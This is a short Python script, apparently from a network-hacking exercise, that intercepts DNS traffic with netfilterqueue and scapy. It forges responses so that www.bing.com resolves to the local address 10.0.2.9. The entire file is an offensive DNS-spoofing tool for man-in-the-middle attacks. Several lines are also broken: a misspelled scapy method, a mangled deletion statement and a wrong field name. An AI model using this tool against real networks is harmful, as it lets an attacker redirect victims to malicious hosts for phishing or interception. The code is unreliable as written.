#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

def process_packet(packet):

    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayers(scapy.DNSRR):
        qname= scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname= qname, rdata="10.0.2.9")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].account = 1

            del_scapy[scapy.IP].len
            del_scapy[scapy.IP].chksum
            del_scapy[scapy.UDP].chksum
            del_scapy[scapy.UDP].len

            packet.set_payload(str(scapy_packet))

    packet.accept() #for dns

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet) #0 for the queue we created in the cmd
queue.run()

